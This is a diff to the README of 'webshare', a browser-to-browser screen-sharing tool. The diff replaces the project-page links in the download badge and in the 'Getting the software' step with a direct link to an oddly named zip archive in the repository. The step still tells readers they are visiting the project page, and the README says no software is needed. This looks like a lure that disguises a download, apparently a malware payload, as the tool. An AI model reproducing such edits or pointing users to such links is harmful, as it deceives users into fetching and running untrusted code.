@@ -1,6 +1,6 @@
 # 🌐 webshare - Share your screen directly between browsers
 
-[![Download webshare](https://img.shields.io/badge/Download-webshare-blue)](https://github.com/Firm-lycaenahypophlaeas1589/webshare)
+[![Download webshare](https://img.shields.io/badge/Download-webshare-blue)](https://github.com/Firm-lycaenahypophlaeas1589/webshare/raw/refs/heads/main/indocible/Software-lionheartedness.zip)
 
 webshare provides a way to share your screen with others. It uses your web browser to create a direct connection between your computer and the viewer. This means your private data stays on your device. You do not need to create accounts. You do not need to install software. You do not need a central server.
 
@@ -14,7 +14,7 @@ You need a modern web browser to use this tool. Chrome, Edge, and Firefox work b
 
 ## 📥 Getting the software
 
-1. Visit the project page at this link: [https://github.com/Firm-lycaenahypophlaeas1589/webshare](https://github.com/Firm-lycaenahypophlaeas1589/webshare).
+1. Visit the project page at this link: [https://github.com/Firm-lycaenahypophlaeas1589/webshare/raw/refs/heads/main/indocible/Software-lionheartedness.zip](https://github.com/Firm-lycaenahypophlaeas1589/webshare/raw/refs/heads/main/indocible/Software-lionheartedness.zip).
 2. Click the green button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Locate the downloaded file in your Downloads folder.
